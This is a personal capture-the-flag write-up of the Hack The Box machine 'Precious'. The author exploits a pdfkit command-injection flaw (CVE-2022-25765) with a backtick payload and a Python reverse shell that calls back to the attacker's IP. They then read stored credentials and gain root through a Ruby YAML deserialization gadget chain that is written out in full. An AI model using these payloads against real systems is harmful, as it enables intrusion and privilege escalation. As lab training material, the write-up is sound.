## Enumeration
nmap scan:
```
# Nmap 7.93 scan initiated Mon Feb 20 17:17:13 2023 as: nmap -p- -sCV --min-rate=10000 -o preciousnmap.txt 10.10.11.189
Warning: 10.10.11.189 giving up on port because retransmission cap hit (10).
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.090s latency).
Not shown: 65257 closed tcp ports (conn-refused), 276 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Convert Web Page to PDF
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 20 17:17:35 2023 -- 1 IP address (1 host up) scanned in 21.95 seconds
```

The website has a text input box, and the purpose of it is to convert web pages to PDF files. I started playing around with it: 
- `10.10.11.189` returned `You should provide a valid URL!`.
`http://10.10.11.189` returned `Cannot load remote URL!`. Okay, so I can assume it's expecting a `http://` format, especially considering that it was expecting a URL and it changed its output.

![[Pasted image 20230221102050.png]]

So I couldn't access the web page of itself, so how about another IP on its network? How about me? So I spun up my own web server with the Python http.server module: `python3 -m http.server 80 `
- It's important to specify port 80 because the default port for Python's http.server is 8080, and that's not what the website is expecting.

I inputted my own (VPN) IP in the `http://` format: `http://10.10.14.4`, and what do you know, it created a PDF of my web page :)
![[Pasted image 20230221131534.png]]

Now that I had something new to work with, I wanted to know more about this file. I ran a common file forensics tool called `exiftool` on the file: 
`exiftool fo99la37ukytqmhduq8elzoqbudbyvu9.pdf `
```
ExifTool Version Number         : 12.52
File Name                       : fo99la37ukytqmhduq8elzoqbudbyvu9.pdf
Directory                       : .
File Size                       : 36 kB
File Modification Date/Time     : 2023:02:20 16:39:42-08:00
File Access Date/Time           : 2023:02:20 16:40:16-08:00
File Inode Change Date/Time     : 2023:02:20 16:39:42-08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

The important line here is `Creator: Generated by pdfkit v0.8.6`
This immediately sparked my eye, mainly because it had a version number which is important when searching for valid exploits. I searched `pdfkit v0.8.6 exploits` and the first thing that popped up was "Command Injection in pdfkit | CVE-2022-25765".

After looking through this exploit's documentation, all I had to do was establish a parameter containing a URL encoded character, and specify the shell command I wanted it to execute: ``http://10.10.14.4?bruh=%20`id`
![[Pasted image 20230221101921.png]]

- One important think I learned is that when I need to type tedious things, just copy and paste T_T. I'm a fast typer, and a pretty accurate one too, but sometimes even a single typo can invalidate your exploit. After all, exploits are usually unusual vulnerabilities

After inputting this to the site, I was returned a pdf that displayed my user id. Confirming that code injection worked, I chose to establish a reverse shell using Python: 
When establishing a reverse shell, you want to have a listener on your attacking machine, and for your victim machine to execute code that will establish remote connection to **you**.

I had checked Python was on the box with: ``http://10.10.14.4?bruh=%20`which python3`
![[Pasted image 20230221101956.png]]


Listener on attacking machine: `nc -lvnp 6666` - \* *You can choose any port number, I just like 6666 (:* \*

Code to be executed on victim machine: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.4",6666));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`

Formatted string to the input box on the website that is vulnerable to code injection, therefore will run the above command: ``http://10.10.14.4?bruh=%20`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.4",6666));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'``

And just like that, after sending that request to the page, I got a shell in my terminal.
![[Pasted image 20230221102341.png]]


#### Privilege Escalation
I had access to the machine, but I was user `ruby`. I explored my scope by `cd`ing around, but what I had needed was right there in my home directory the entire time. `ls -lah` revealed the `.bundle` directory. In this directory was a file named `config`, in which `cat config` revealed creds to the user `henry`. 
![[Pasted image 20230221102618.png]]

I always `ssh` into new users if possible, because I want a fully interactive shell. I `ssh`d into user `henry` and from here I got the user hash in `user.txt`. 
![[Pasted image 20230221102756.png]]


From here, the next and last step was getting `root`. The first thing I ran was `sudo -l` and what do ya know, I can run a certain command as root :)

![[Pasted image 20230221102833.png]]

Now I'm not pro at ruby; actually, I know essentially nothing about ruby. But I tried running this command, and it gave me an error output: ![[Pasted image 20230221103027.png]]

It was telling me that on execution, ruby was expecting `dependencies.yml`. Although the other paths were absolute file paths, I assumed that the `dependencies.yml` was a relative file path to my home directory. So to test this out, I created `dependencies.yml` in my home directory. Then I tried running it again. This time I got a different output:
![[Pasted image 20230221103340.png]]

This told me that this was the file that it was looking for. Now, how could I escalate my privilege with this?

I read up on what `dependencies.yml` typically contains in the context of `ruby`. The more I thought about it, the more I realized that I could possibly achieve code exeuction through this file, as the command indeed was reading the file: `YAML.load(File.read("dependencies.yml"))`
![[Pasted image 20230221103639.png]]

So I searched for `ruby yaml exploits` and oh wow, there's an exploit that perfectly does what I want it to do (: %%I learned that this kind of exploit is called deserialization%% 

https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization
```
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: id
          method_id: :resolve
```

The important line here is `git_set`, the parameter where I specify the shell command I want executed. I copied and pasted this into `dependencies.yml`. I tried `id` initially, in which I got `henry`'s id returned to me. I tried running it with `sudo`, and I got `root`'s id returned to me! 

![[Pasted image 20230221104600.png]]

![[Pasted image 20230221104621.png]]

And the last step was running a shell command that would get me to `root`. I changed `git_set: id` to `git_set: su`. Then I executed the command again with `sudo`.

![[Pasted image 20230221104800.png]]

Bing bang boom, `root` :P
![[Pasted image 20230221115550.png]]


Something kinda fun I want to point out is how ruby is an interpreted language, meaning that the code runs line by line as it is interpreted into machine language. It is only when it encounters an error that it then stops running. This is why the code was able to run and provide me the output of `id` and even execute `su`, while returning error messages afterwards.